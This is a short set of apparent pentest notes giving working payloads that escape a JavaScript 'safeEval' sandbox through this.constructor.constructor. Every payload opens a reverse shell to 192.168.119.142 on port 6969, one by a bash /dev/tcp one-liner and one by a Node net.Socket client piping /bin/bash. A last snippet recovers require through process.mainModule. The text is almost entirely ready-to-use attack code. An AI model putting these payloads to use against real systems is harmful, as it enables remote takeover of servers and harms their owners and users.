Reverse shell payload with the bash-one-line:
safeEval("this.constructor.constructor('return child_process')().exec('bash -i >& /dev/tcp/192.168.119.142/6969 0>&1')");

Reverse shell payload with JavaScript:
safeEval("net = this.constructor.constructor('return net')(), sh = this.constructor.constructor('return child_process')().exec('/bin/bash');client = new net.Socket();client.connect(6969, '192.168.119.142', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});");

If require is not available, to obtain the require by:
process = this.constructor.constructor('return (function(){return process})()')();
var require = process.mainModule.require;
